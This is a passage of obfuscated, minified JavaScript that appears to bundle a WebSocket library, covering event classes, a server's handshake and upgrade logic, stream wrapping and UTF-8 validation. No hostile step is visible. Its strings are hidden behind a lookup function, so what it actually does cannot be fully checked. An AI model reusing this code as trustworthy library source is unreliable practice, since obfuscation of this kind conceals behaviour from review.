this[_0xe6b207];}get[_0x2c4257(0x1f6)](){return this[_0xfea365];}get['wasClean'](){return this[_0x5c86f5];}}Object['defineProperty'](_0x27c346[_0x2c4257(0x25b)],_0x2c4257(0x17c),{'enumerable':!0x0}),Object[_0x2c4257(0x19c)](_0x27c346[_0x2c4257(0x25b)],_0x2c4257(0x1f6),{'enumerable':!0x0}),Object['defineProperty'](_0x27c346[_0x2c4257(0x25b)],_0x2c4257(0x163),{'enumerable':!0x0});class _0x2c6d51 extends _0x471113{constructor(_0x60ceb8,_0x52fc37={}){const _0x355e5e=_0x2c4257;super(_0x60ceb8),this[_0x123f99]=void 0x0===_0x52fc37['error']?null:_0x52fc37[_0x355e5e(0x1b9)],this[_0x10f37f]=void 0x0===_0x52fc37[_0x355e5e(0x1df)]?'':_0x52fc37['message'];}get['error'](){return this[_0x123f99];}get[_0x2c4257(0x1df)](){return this[_0x10f37f];}}Object[_0x2c4257(0x19c)](_0x2c6d51['prototype'],'error',{'enumerable':!0x0}),Object[_0x2c4257(0x19c)](_0x2c6d51[_0x2c4257(0x25b)],_0x2c4257(0x1df),{'enumerable':!0x0});class _0xb92882 extends _0x471113{constructor(_0x298b37,_0x5303ca={}){const _0x472b1c=_0x2c4257;super(_0x298b37),this[_0x48ad16]=void 0x0===_0x5303ca[_0x472b1c(0x19a)]?null:_0x5303ca[_0x472b1c(0x19a)];}get[_0x2c4257(0x19a)](){return this[_0x48ad16];}}Object[_0x2c4257(0x19c)](_0xb92882[_0x2c4257(0x25b)],'data',{'enumerable':!0x0});const _0x3c277c={'addEventListener'(_0xaeedfc,_0x23f78b,_0x30e494={}){const _0x1a558b=_0x2c4257;for(const _0x44b685 of this[_0x1a558b(0x23b)](_0xaeedfc))if(!_0x30e494[_0x24b5c7]&&_0x44b685[_0x655c0b]===_0x23f78b&&!_0x44b685[_0x24b5c7])return;let _0x3e7e47;if('message'===_0xaeedfc)_0x3e7e47=function(_0xb09151,_0x1a8b1b){const _0x4f6371=_0x1a558b,_0x31b8db=new _0xb92882(_0x4f6371(0x1df),{'data':_0x1a8b1b?_0xb09151:_0xb09151[_0x4f6371(0xfc)]()});_0x31b8db[_0x41b23d]=this,_0x481319(_0x23f78b,this,_0x31b8db);};else{if('close'===_0xaeedfc)_0x3e7e47=function(_0x1c15a9,_0x145360){const _0x258990=_0x1a558b,_0x2baf57=new _0x27c346(_0x258990(0x1d3),{'code':_0x1c15a9,'reason':_0x145360['toString'](),'wasClean':this[_0x258990(0x194)]&&this[_0x258990(0x8e)]});_0x2baf57[_0x41b23d]=this,_0x481319(_0x23f78b,this,_0x2baf57);};else{if(_0x1a558b(0x1b9)===_0xaeedfc)_0x3e7e47=function(_0x4af437){const _0xe7ff32=_0x1a558b,_0x2f4e1e=new _0x2c6d51('error',{'error':_0x4af437,'message':_0x4af437[_0xe7ff32(0x1df)]});_0x2f4e1e[_0x41b23d]=this,_0x481319(_0x23f78b,this,_0x2f4e1e);};else{if(_0x1a558b(0x130)!==_0xaeedfc)return;_0x3e7e47=function(){const _0x6f3b46=_0x1a558b,_0x46ec7a=new _0x471113(_0x6f3b46(0x130));_0x46ec7a[_0x41b23d]=this,_0x481319(_0x23f78b,this,_0x46ec7a);};}}}_0x3e7e47[_0x24b5c7]=!!_0x30e494[_0x24b5c7],_0x3e7e47[_0x655c0b]=_0x23f78b,_0x30e494['once']?this[_0x1a558b(0x205)](_0xaeedfc,_0x3e7e47):this['on'](_0xaeedfc,_0x3e7e47);},'removeEventListener'(_0x3a3832,_0x5e2518){const _0x5bbfae=_0x2c4257;for(const _0x1768af of this['listeners'](_0x3a3832))if(_0x1768af[_0x655c0b]===_0x5e2518&&!_0x1768af[_0x24b5c7]){this[_0x5bbfae(0xf2)](_0x3a3832,_0x1768af);break;}}};function _0x481319(_0x4a3a19,_0x49f452,_0x289fd8){const _0x15314b=_0x2c4257;'object'==typeof _0x4a3a19&&_0x4a3a19[_0x15314b(0x15d)]?_0x4a3a19[_0x15314b(0x15d)]['call'](_0x4a3a19,_0x289fd8):_0x4a3a19[_0x15314b(0xc8)](_0x49f452,_0x289fd8);}_0x330403[_0x2c4257(0x1f0)]={'CloseEvent':_0x27c346,'ErrorEvent':_0x2c6d51,'Event':_0x471113,'EventTarget':_0x3c277c,'MessageEvent':_0xb92882};},0x263(_0x1fe446){'use strict';const _0x260d67=a0_0x208b;_0x1fe446[_0x260d67(0x1f0)]=require(_0x260d67(0x134));},0x266(_0x9745c5){'use strict';const _0x43d8ee=a0_0x208b;const _0x25965d=[_0x43d8ee(0x10b),'arraybuffer','fragments'],_0x474e57=_0x43d8ee(0x155)!=typeof Blob;_0x474e57&&_0x25965d[_0x43d8ee(0xa9)](_0x43d8ee(0x86)),_0x9745c5[_0x43d8ee(0x1f0)]={'BINARY_TYPES':_0x25965d,'EMPTY_BUFFER':Buffer[_0x43d8ee(0x167)](0x0),'GUID':_0x43d8ee(0x21a),'hasBlob':_0x474e57,'kForOnEventAttribute':Symbol(_0x43d8ee(0x1e1)),'kListener':Symbol(_0x43d8ee(0x20d)),'kStatusCode':Symbol(_0x43d8ee(0x1d9)),'kWebSocket':Symbol(_0x43d8ee(0x209)),'NOOP':()=>{}};},0x2b4(_0x3d24ec){'use strict';const _0x126eae=a0_0x208b;_0x3d24ec[_0x126eae(0x1f0)]=require(_0x126eae(0x24e));},0x2bb(_0x44e198,_0x34c360,_0x4c6e00){'use strict';const _0x3d6c78=a0_0x208b;const _0x458532=_0x4c6e00(0x3c);_0x458532['createWebSocketStream']=_0x4c6e00(0x2cf),_0x458532[_0x3d6c78(0x23e)]=_0x4c6e00(0x2d2),_0x458532[_0x3d6c78(0x1ed)]=_0x4c6e00(0x11e),_0x458532[_0x3d6c78(0x1a4)]=_0x4c6e00(0x392),_0x458532[_0x3d6c78(0x123)]=_0x458532,_0x458532[_0x3d6c78(0x1db)]=_0x458532['Server'],_0x44e198[_0x3d6c78(0x1f0)]=_0x458532;},0x2cf(_0x5b9739,_0x540d37,_0x30aa64){'use strict';const _0x10f9b4=a0_0x208b;_0x30aa64(0x3c);const {Duplex:_0x1a27fb}=_0x30aa64(0xcb);function _0x15ac81(_0x4aea76){const _0x374222=a0_0x208b;_0x4aea76[_0x374222(0x200)]('close');}function _0xa0fbd1(){const _0x18f93f=a0_0x208b;!this[_0x18f93f(0xa4)]&&this[_0x18f93f(0x223)][_0x18f93f(0x132)]&&this[_0x18f93f(0x220)]();}function _0x598682(_0x240621){const _0x35c5bb=a0_0x208b;this[_0x35c5bb(0xf2)]('error',_0x598682),this[_0x35c5bb(0x220)](),0x0===this[_0x35c5bb(0xee)](_0x35c5bb(0x1b9))&&this[_0x35c5bb(0x200)](_0x35c5bb(0x1b9),_0x240621);}_0x5b9739[_0x10f9b4(0x1f0)]=function(_0x3a7dab,_0x3ecf26){const _0x4d6c34=_0x10f9b4;let _0x5811e1=!0x0;const _0x290851=new _0x1a27fb({..._0x3ecf26,'autoDestroy':!0x1,'emitClose':!0x1,'objectMode':!0x1,'writableObjectMode':!0x1});return _0x3a7dab['on'](_0x4d6c34(0x1df),function(_0x200ea3,_0x599675){const _0x265e1e=_0x4d6c34,_0x54768a=!_0x599675&&_0x290851['_readableState'][_0x265e1e(0x249)]?_0x200ea3[_0x265e1e(0xfc)]():_0x200ea3;_0x290851[_0x265e1e(0xa9)](_0x54768a)||_0x3a7dab[_0x265e1e(0x110)]();}),_0x3a7dab['once'](_0x4d6c34(0x1b9),function(_0x124cf1){const _0xb4caef=_0x4d6c34;_0x290851[_0xb4caef(0xa4)]||(_0x5811e1=!0x1,_0x290851[_0xb4caef(0x220)](_0x124cf1));}),_0x3a7dab[_0x4d6c34(0x205)](_0x4d6c34(0x1d3),function(){const _0x166841=_0x4d6c34;_0x290851[_0x166841(0xa4)]||_0x290851[_0x166841(0xa9)](null);}),_0x290851[_0x4d6c34(0x1a2)]=function(_0x29ea38,_0xb192b7){const _0x2de3be=_0x4d6c34;if(_0x3a7dab['readyState']===_0x3a7dab[_0x2de3be(0xf6)])return _0xb192b7(_0x29ea38),void process[_0x2de3be(0x128)](_0x15ac81,_0x290851);let _0x372541=!0x1;_0x3a7dab['once'](_0x2de3be(0x1b9),function(_0x57288f){_0x372541=!0x0,_0xb192b7(_0x57288f);}),_0x3a7dab[_0x2de3be(0x205)](_0x2de3be(0x1d3),function(){const _0x4cd291=_0x2de3be;_0x372541||_0xb192b7(_0x29ea38),process[_0x4cd291(0x128)](_0x15ac81,_0x290851);}),_0x5811e1&&_0x3a7dab[_0x2de3be(0x1a5)]();},_0x290851['_final']=function(_0x8b1ac2){const _0x3d97bf=_0x4d6c34;_0x3a7dab[_0x3d97bf(0x121)]!==_0x3a7dab['CONNECTING']?null!==_0x3a7dab[_0x3d97bf(0xe9)]&&(_0x3a7dab[_0x3d97bf(0xe9)][_0x3d97bf(0x223)]['finished']?(_0x8b1ac2(),_0x290851[_0x3d97bf(0x114)][_0x3d97bf(0x1a9)]&&_0x290851[_0x3d97bf(0x220)]()):(_0x3a7dab[_0x3d97bf(0xe9)][_0x3d97bf(0x205)](_0x3d97bf(0x8c),function(){_0x8b1ac2();}),_0x3a7dab[_0x3d97bf(0x1d3)]())):_0x3a7dab[_0x3d97bf(0x205)](_0x3d97bf(0x130),function(){const _0x5c7ed8=_0x3d97bf;_0x290851[_0x5c7ed8(0x214)](_0x8b1ac2);});},_0x290851[_0x4d6c34(0x1ce)]=function(){const _0x5ae011=_0x4d6c34;_0x3a7dab[_0x5ae011(0xd7)]&&_0x3a7dab['resume']();},_0x290851[_0x4d6c34(0x245)]=function(_0x2df64e,_0x38deeb,_0x5e8151){const _0x51c890=_0x4d6c34;_0x3a7dab['readyState']!==_0x3a7dab[_0x51c890(0x11f)]?_0x3a7dab[_0x51c890(0x77)](_0x2df64e,_0x5e8151):_0x3a7dab[_0x51c890(0x205)](_0x51c890(0x130),function(){const _0x243f5d=_0x51c890;_0x290851[_0x243f5d(0x245)](_0x2df64e,_0x38deeb,_0x5e8151);});},_0x290851['on'](_0x4d6c34(0x1ac),_0xa0fbd1),_0x290851['on']('error',_0x598682),_0x290851;};},0x2d2(_0x51d48d,_0x3b1570,_0x404352){'use strict';const _0x32efb1=a0_0x208b;const _0x163499=_0x404352(0x1b2),_0x35506e=_0x404352(0x263),{Duplex:_0x1184f}=_0x404352(0xcb),{createHash:_0x277689}=_0x404352(0x3d6),_0x2c1e6c=_0x404352(0x39e),_0x4ec6be=_0x404352(0x3cb),_0x5af3b2=_0x404352(0xed),_0x52320d=_0x404352(0x3c),{GUID:_0x182544,kWebSocket:_0x41e19c}=_0x404352(0x266),_0x2ca2be=/^[+/0-9A-Za-z]{22}==$/;function _0x4471eb(_0x5b4da4){const _0x26d21a=a0_0x208b;_0x5b4da4[_0x26d21a(0x1c4)]=0x2,_0x5b4da4[_0x26d21a(0x200)](_0x26d21a(0x1d3));}function _0x1eb496(){const _0x50a6e6=a0_0x208b;this[_0x50a6e6(0x220)]();}function _0x20d02f(_0x13b49b,_0x3a1234,_0x562709,_0x781fdc){const _0xaae6ae=a0_0x208b;_0x562709=_0x562709||_0x35506e[_0xaae6ae(0x126)][_0x3a1234],_0x781fdc={'Connection':_0xaae6ae(0x1d3),'Content-Type':'text/html','Content-Length':Buffer[_0xaae6ae(0x90)](_0x562709),..._0x781fdc},_0x13b49b[_0xaae6ae(0x205)](_0xaae6ae(0x8c),_0x13b49b[_0xaae6ae(0x220)]),_0x13b49b['end']('HTTP/1.1\x20'+_0x3a1234+'\x20'+_0x35506e[_0xaae6ae(0x126)][_0x3a1234]+'\x0d\x0a'+Object[_0xaae6ae(0xc9)](_0x781fdc)['map'](_0x3edd3a=>_0x3edd3a+':\x20'+_0x781fdc[_0x3edd3a])[_0xaae6ae(0x219)]('\x0d\x0a')+_0xaae6ae(0x1d1)+_0x562709);}function _0x1717e6(_0x1faded,_0x20f0fd,_0x4b2c45,_0x29e91a,_0x2bd471,_0x47136b){const _0x4cb14f=a0_0x208b;if(_0x1faded[_0x4cb14f(0xee)](_0x4cb14f(0x13d))){const _0x379ad0=new Error(_0x2bd471);Error[_0x4cb14f(0x1d0)](_0x379ad0,_0x1717e6),_0x1faded[_0x4cb14f(0x200)](_0x4cb14f(0x13d),_0x379ad0,_0x4b2c45,_0x20f0fd);}else _0x20d02f(_0x4b2c45,_0x29e91a,_0x2bd471,_0x47136b);}_0x51d48d[_0x32efb1(0x1f0)]=class extends _0x163499{constructor(_0x5a42ea,_0x3eecbc){const _0x5f40b0=_0x32efb1;if(super(),null==(_0x5a42ea={'allowSynchronousEvents':!0x0,'autoPong':!0x0,'maxPayload':0x6400000,'skipUTF8Validation':!0x1,'perMessageDeflate':!0x1,'handleProtocols':null,'clientTracking':!0x0,'verifyClient':null,'noServer':!0x1,'backlog':null,'server':null,'host':null,'path':null,'port':null,'WebSocket':_0x52320d,..._0x5a42ea})[_0x5f40b0(0x1b1)]&&!_0x5a42ea[_0x5f40b0(0x1b8)]&&!_0x5a42ea[_0x5f40b0(0x144)]||null!=_0x5a42ea[_0x5f40b0(0x1b1)]&&(_0x5a42ea[_0x5f40b0(0x1b8)]||_0x5a42ea[_0x5f40b0(0x144)])||_0x5a42ea[_0x5f40b0(0x1b8)]&&_0x5a42ea['noServer'])throw new TypeError(_0x5f40b0(0x10a));if(null!=_0x5a42ea[_0x5f40b0(0x1b1)]?(this[_0x5f40b0(0x8b)]=_0x35506e['createServer']((_0x4c0ca2,_0x51cb96)=>{const _0x2993c7=_0x5f40b0,_0x53baff=_0x35506e[_0x2993c7(0x126)][0x1aa];_0x51cb96[_0x2993c7(0x211)](0x1aa,{'Content-Length':_0x53baff['length'],'Content-Type':_0x2993c7(0xb3)}),_0x51cb96['end'](_0x53baff);}),this[_0x5f40b0(0x8b)][_0x5f40b0(0x7c)](_0x5a42ea[_0x5f40b0(0x1b1)],_0x5a42ea[_0x5f40b0(0x228)],_0x5a42ea[_0x5f40b0(0x137)],_0x3eecbc)):_0x5a42ea[_0x5f40b0(0x1b8)]&&(this[_0x5f40b0(0x8b)]=_0x5a42ea[_0x5f40b0(0x1b8)]),this['_server']){const _0x12680b=this[_0x5f40b0(0x200)][_0x5f40b0(0x204)](this,_0x5f40b0(0x157));this['_removeListeners']=function(_0x1e186d,_0x1a1f71){const _0x4d71ca=_0x5f40b0;for(const _0x2131f9 of Object[_0x4d71ca(0xc9)](_0x1a1f71))_0x1e186d['on'](_0x2131f9,_0x1a1f71[_0x2131f9]);return function(){const _0x324a3c=_0x4d71ca;for(const _0x2e9719 of Object[_0x324a3c(0xc9)](_0x1a1f71))_0x1e186d[_0x324a3c(0xf2)](_0x2e9719,_0x1a1f71[_0x2e9719]);};}(this[_0x5f40b0(0x8b)],{'listening':this[_0x5f40b0(0x200)]['bind'](this,_0x5f40b0(0x176)),'error':this[_0x5f40b0(0x200)][_0x5f40b0(0x204)](this,'error'),'upgrade':(_0x38c1aa,_0x39c3b6,_0x36e89d)=>{const _0x193aed=_0x5f40b0;this[_0x193aed(0x1b3)](_0x38c1aa,_0x39c3b6,_0x36e89d,_0x12680b);}});}!0x0===_0x5a42ea[_0x5f40b0(0x191)]&&(_0x5a42ea[_0x5f40b0(0x191)]={}),_0x5a42ea[_0x5f40b0(0x25d)]&&(this[_0x5f40b0(0x147)]=new Set(),this[_0x5f40b0(0x1c5)]=!0x1),this[_0x5f40b0(0xe1)]=_0x5a42ea,this[_0x5f40b0(0x1c4)]=0x0;}[_0x32efb1(0xa2)](){const _0x1ba916=_0x32efb1;if(this['options'][_0x1ba916(0x144)])throw new Error(_0x1ba916(0x141));return this[_0x1ba916(0x8b)]?this[_0x1ba916(0x8b)][_0x1ba916(0xa2)]():null;}[_0x32efb1(0x1d3)](_0x1d2cf7){const _0x36c5ac=_0x32efb1;if(0x2===this['_state'])return _0x1d2cf7&&this[_0x36c5ac(0x205)]('close',()=>{_0x1d2cf7(new Error('The\x20server\x20is\x20not\x20running'));}),void process[_0x36c5ac(0x128)](_0x4471eb,this);if(_0x1d2cf7&&this[_0x36c5ac(0x205)]('close',_0x1d2cf7),0x1!==this[_0x36c5ac(0x1c4)]){if(this[_0x36c5ac(0x1c4)]=0x1,this['options'][_0x36c5ac(0x144)]||this[_0x36c5ac(0xe1)][_0x36c5ac(0x1b8)])this[_0x36c5ac(0x8b)]&&(this[_0x36c5ac(0x1c9)](),this[_0x36c5ac(0x1c9)]=this[_0x36c5ac(0x8b)]=null),this['clients']&&this[_0x36c5ac(0x147)]['size']?this['_shouldEmitClose']=!0x0:process[_0x36c5ac(0x128)](_0x4471eb,this);else{const _0x4468c0=this['_server'];this[_0x36c5ac(0x1c9)](),this[_0x36c5ac(0x1c9)]=this['_server']=null,_0x4468c0[_0x36c5ac(0x1d3)](()=>{_0x4471eb(this);});}}}[_0x32efb1(0x224)](_0x504cc9){const _0x54370a=_0x32efb1;if(this[_0x54370a(0xe1)]['path']){const _0x46f5fd=_0x504cc9[_0x54370a(0x23d)][_0x54370a(0x1f4)]('?');if((-0x1!==_0x46f5fd?_0x504cc9['url'][_0x54370a(0x233)](0x0,_0x46f5fd):_0x504cc9[_0x54370a(0x23d)])!==this['options']['path'])return!0x1;}return!0x0;}[_0x32efb1(0x1b3)](_0x46a9fd,_0x1f91f7,_0x4fe267,_0x1058a6){const _0xc703b6=_0x32efb1;_0x1f91f7['on'](_0xc703b6(0x1b9),_0x1eb496);const _0x56b742=_0x46a9fd[_0xc703b6(0x9a)][_0xc703b6(0xcf)],_0x53afa6=_0x46a9fd['headers']['upgrade'],_0x363b3f=+_0x46a9fd['headers'][_0xc703b6(0x151)];if(_0xc703b6(0xf9)!==_0x46a9fd[_0xc703b6(0xa1)])return void _0x1717e6(this,_0x46a9fd,_0x1f91f7,0x195,_0xc703b6(0x9b));if(void 0x0===_0x53afa6||'websocket'!==_0x53afa6['toLowerCase']())return void _0x1717e6(this,_0x46a9fd,_0x1f91f7,0x190,_0xc703b6(0x166));if(void 0x0===_0x56b742||!_0x2ca2be[_0xc703b6(0xe8)](_0x56b742))return void _0x1717e6(this,_0x46a9fd,_0x1f91f7,0x190,_0xc703b6(0x79));if(0xd!==_0x363b3f&&0x8!==_0x363b3f)return void _0x1717e6(this,_0x46a9fd,_0x1f91f7,0x190,_0xc703b6(0x202),{'Sec-WebSocket-Version':'13,\x208'});if(!this[_0xc703b6(0x224)](_0x46a9fd))return void _0x20d02f(_0x1f91f7,0x190);const _0x54a581=_0x46a9fd[_0xc703b6(0x9a)][_0xc703b6(0x1fd)];let _0x2915a1=new Set();if(void 0x0!==_0x54a581)try{_0x2915a1=_0x5af3b2[_0xc703b6(0x160)](_0x54a581);}catch(_0x5a45fd){return void _0x1717e6(this,_0x46a9fd,_0x1f91f7,0x190,_0xc703b6(0x243));}const _0x532926=_0x46a9fd['headers']['sec-websocket-extensions'],_0x5ee932={};if(this[_0xc703b6(0xe1)][_0xc703b6(0x191)]&&void 0x0!==_0x532926){const _0x4f0b29=new _0x4ec6be(this['options'][_0xc703b6(0x191)],!0x0,this[_0xc703b6(0xe1)]['maxPayload']);try{const _0x76f9c7=_0x2c1e6c['parse'](_0x532926);_0x76f9c7[_0x4ec6be[_0xc703b6(0x1e6)]]&&(_0x4f0b29['accept'](_0x76f9c7[_0x4ec6be[_0xc703b6(0x1e6)]]),_0x5ee932[_0x4ec6be[_0xc703b6(0x1e6)]]=_0x4f0b29);}catch(_0x5f21dc){return void _0x1717e6(this,_0x46a9fd,_0x1f91f7,0x190,'Invalid\x20or\x20unacceptable\x20Sec-WebSocket-Extensions\x20header');}}if(this[_0xc703b6(0xe1)][_0xc703b6(0x210)]){const _0x883bf3={'origin':_0x46a9fd[_0xc703b6(0x9a)][0x8===_0x363b3f?_0xc703b6(0x1f8):_0xc703b6(0x1ad)],'secure':!(!_0x46a9fd['socket'][_0xc703b6(0x12a)]&&!_0x46a9fd[_0xc703b6(0x105)][_0xc703b6(0xfe)]),'req':_0x46a9fd};if(0x2===this['options']['verifyClient'][_0xc703b6(0x1d7)])return void this[_0xc703b6(0xe1)][_0xc703b6(0x210)](_0x883bf3,(_0x1a0554,_0x3eee05,_0x33ef78,_0x18e72d)=>{if(!_0x1a0554)return _0x20d02f(_0x1f91f7,_0x3eee05||0x191,_0x33ef78,_0x18e72d);this['completeUpgrade'](_0x5ee932,_0x56b742,_0x2915a1,_0x46a9fd,_0x1f91f7,_0x4fe267,_0x1058a6);});if(!this[_0xc703b6(0xe1)][_0xc703b6(0x210)](_0x883bf3))return _0x20d02f(_0x1f91f7,0x191);}this[_0xc703b6(0x10d)](_0x5ee932,_0x56b742,_0x2915a1,_0x46a9fd,_0x1f91f7,_0x4fe267,_0x1058a6);}[_0x32efb1(0x10d)](_0x4dd015,_0x519432,_0x53ddc5,_0x460a8a,_0x2b0a5f,_0x47f234,_0xfe3355){const _0x447b9d=_0x32efb1;if(!_0x2b0a5f['readable']||!_0x2b0a5f[_0x447b9d(0x124)])return _0x2b0a5f['destroy']();if(_0x2b0a5f[_0x41e19c])throw new Error('server.handleUpgrade()\x20was\x20called\x20more\x20than\x20once\x20with\x20the\x20same\x20socket,\x20possibly\x20due\x20to\x20a\x20misconfiguration');if(this['_state']>0x0)return _0x20d02f(_0x2b0a5f,0x1f7);const _0x4f316c=[_0x447b9d(0x11d),_0x447b9d(0x98),_0x447b9d(0x87),_0x447b9d(0x138)+_0x277689('sha1')['update'](_0x519432+_0x182544)['digest']('base64')],_0x489573=new this[(_0x447b9d(0xe1))][(_0x447b9d(0x123))](null,void 0x0,this[_0x447b9d(0xe1)]);if(_0x53ddc5[_0x447b9d(0x222)]){const _0x4b9488=this[_0x447b9d(0xe1)][_0x447b9d(0x254)]?this['options']['handleProtocols'](_0x53ddc5,_0x460a8a):_0x53ddc5[_0x447b9d(0xda)]()[_0x447b9d(0xc7)]()[_0x447b9d(0x1a1)];_0x4b9488&&(_0x4f316c[_0x447b9d(0xa9)](_0x447b9d(0x231)+_0x4b9488),_0x489573[_0x447b9d(0x1d2)]=_0x4b9488);}if(_0x4dd015[_0x4ec6be[_0x447b9d(0x1e6)]]){const _0x414d67=_0x4dd015[_0x4ec6be['extensionName']][_0x447b9d(0x18a)],_0x2648ec=_0x2c1e6c[_0x447b9d(0x148)]({[_0x4ec6be[_0x447b9d(0x1e6)]]:[_0x414d67]});_0x4f316c[_0x447b9d(0xa9)](_0x447b9d(0x189)+_0x2648ec),_0x489573['_extensions']=_0x4dd015;}this['emit']('headers',_0x4f316c,_0x460a8a),_0x2b0a5f[_0x447b9d(0xe6)](_0x4f316c[_0x447b9d(0x25f)]('\x0d\x0a')[_0x447b9d(0x219)]('\x0d\x0a')),_0x2b0a5f[_0x447b9d(0xf2)](_0x447b9d(0x1b9),_0x1eb496),_0x489573[_0x447b9d(0x11b)](_0x2b0a5f,_0x47f234,{'allowSynchronousEvents':this[_0x447b9d(0xe1)][_0x447b9d(0x16e)],'maxPayload':this[_0x447b9d(0xe1)][_0x447b9d(0x190)],'skipUTF8Validation':this[_0x447b9d(0xe1)][_0x447b9d(0x242)]}),this[_0x447b9d(0x147)]&&(this[_0x447b9d(0x147)][_0x447b9d(0x181)](_0x489573),_0x489573['on']('close',()=>{const _0x353dd9=_0x447b9d;this[_0x353dd9(0x147)][_0x353dd9(0xea)](_0x489573),this[_0x353dd9(0x1c5)]&&!this['clients']['size']&&process['nextTick'](_0x4471eb,this);})),_0xfe3355(_0x489573,_0x460a8a);}};},0x2f4(_0x4aef66){'use strict';const _0x3198f1=a0_0x208b;_0x4aef66[_0x3198f1(0x1f0)]=require(_0x3198f1(0xcb));},0x2f7(_0x22e448){'use strict';const _0x32ddd3=a0_0x208b;const _0x302f7c=Symbol(_0x32ddd3(0x1f5)),_0x266a76=Symbol('kRun');_0x22e448[_0x32ddd3(0x1f0)]=class{constructor(_0xfb4ee2){const _0x5bb373=_0x32ddd3;this[_0x302f7c]=()=>{this['pending']--,this[_0x266a76]();},this['concurrency']=_0xfb4ee2||0x1/0x0,this[_0x5bb373(0xa6)]=[],this[_0x5bb373(0x165)]=0x0;}[_0x32ddd3(0x181)](_0x45e491){const _0x35de05=_0x32ddd3;this[_0x35de05(0xa6)][_0x35de05(0xa9)](_0x45e491),this[_0x266a76]();}[_0x266a76](){const _0x2fa189=_0x32ddd3;if(this['pending']!==this[_0x2fa189(0x253)]&&this[_0x2fa189(0xa6)]['length']){const _0xc1b3eb=this[_0x2fa189(0xa6)][_0x2fa189(0x171)]();this[_0x2fa189(0x165)]++,_0xc1b3eb(this[_0x302f7c]);}}};},0x370(_0x130718,_0x1c199b,_0x7d5181){'use strict';const _0x3f49dc=a0_0x208b;const {isUtf8:_0xee198d}=_0x7d5181(0xb5),{hasBlob:_0x47427f}=_0x7d5181(0x266);function _0x2a1d43(_0x1b866d){const _0x21936a=_0x1b866d['length'];let _0x20aaca=0x0;for(;_0x20aaca<_0x21936a;)if(0x80&_0x1b866d[_0x20aaca]){if(0xc0==(0xe0&_0x1b866d[_0x20aaca])){if(_0x20aaca+0x1===_0x21936a||0x80!=(0xc0&_0x1b866d[_0x20aaca+0x1])||0xc0==(0xfe&_0x1b866d[_0x20aaca]))return!0x1;_0x20aaca+=0x2;}else{if(0xe0==(0xf0&_0x1b866d[_0x20aaca])){if(_0x20aaca+0x2>=_0x21936a||0x80!=(0xc0&_0x1b866d[_0x20aaca+0x1])||0x80!=(0xc0&_0x1b866d[_0x20aaca+0x2])||0xe0===_0x1b866d[_0x20aaca]&&0x80==(0xe0&_0x1b866d[_0x20aaca+0x1])||0xed===_0x1b866d[_0x20aaca]&&0xa0==(0xe0&_0x1b866d[_0x20aaca+0x1]))return!0x1;_0x20aaca+=0x3;}else{if(0xf0!=(0xf8&_0x1b866d[_0x20aaca]))return!0x1;if(_0x20aaca+0x3>=_0x21936a||0x80!=(0xc0&_0x1b866d[_0x20aaca+0x1])||0x80!=(0xc0&_0x1b866d[_0x20aaca+0x2])||0x80!=(0xc0&_0x1b866d[_0x20aaca+0x3])||0xf0===_0x1b866d[_0x20aaca]&&0x80==(0xf0&_0x1b866d[_0x20aaca+0x1])||0xf4===_0x1b866d[_0x20aaca]&&_0x1b866d[_0x20aaca+0x1]>0x8f||_0x1b866d[_0x20aaca]>0xf4)return!0x1;_0x20aaca+=0x4;}}}else _0x20aaca++;return!0x0;}if(_0x130718[_0x3f49dc(0x1f0)]={'isBlob':function(_0x172acb){const _0x29d578=_0x3f49dc;return _0x47427f&&'object'==typeof _0x172acb&&_0x29d578(0xd4)==typeof _0x172acb['arrayBuffer']&&'string'==typeof _0x172acb[_0x29d578(0x81)]&&_0x29d578(0xd4)==typeof _0x172acb[_0x29d578(0xd9)]&&(_0x29d578(0x97)===_0x172acb[Symbol[_0x29d578(0x169)]]||_0x29d578(0x1cb)===_0x172acb[Symbol[_0x29d578(0x169)]]);},'isValidStatusCode':function(_0x1803c3){return _0x1803c3>=0x3e8&&_0x1803c3<=0x3f6&&0x3ec!==_0x1803c3&&0x3ed!==_0x1803c3&&0x3ee!==_0x1803c3||_0x1803c3>=0xbb8&&_0x1803c3<=0x1387;},'isValidUTF8':_0x2a1d43,'tokenChars':[0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x1,0x1,0x1,0x1,0x1,0x0,0x0,0x1,0x1,0x0,0x1,0x1,0x0,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x0,0x0,0x0,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x0,0x1,0x0,0x1,0x0]},_0xee198d)_0x130718[_0x3f49dc(0x1f0)][_0x3f49dc(0x188)]=function(_0x182b7e){const _0x57c3f1=_0x3f49dc;return _0x182b7e[_0x57c3f1(0x1d7)]<0x18?_0x2a1d43(_0x182b7e):_0xee198d(_0x182b7e);};else{if(!process[_0x3f49dc(0x1eb)]['WS_NO_UTF_8_VALIDATE'])try{const _0x41d00b=_0x7d5181(Object((function(){const _0x415d78=_0x3f49dc;var _0xcec562=new Error(_0x415d78(0x100));throw _0xcec562[_0x415d78(0x17c)]=_0x415d78(0x118),_0xcec562;}())));_0x130718[_0x3f49dc(0x1f0)][_0x3f49dc(0x188)]=function(_0x5b3cc8){return _0x5b3cc8['length']<0x20?_0x2a1d43(_0x5b3cc8):_0x41d00b(_0x5b3cc8);};}catch(_0xeecc34){}}},0x380(_0x31f21c){'use strict';const _0x3accc3=a0_0x208b;_0x31f21c[_0x3accc3(0x1f0)]=require('fs');},0x392(_0x5e982f,_0x5e3502,_0x16bbf8){'use strict';const _0x17ecd7=a0_0x208b;const 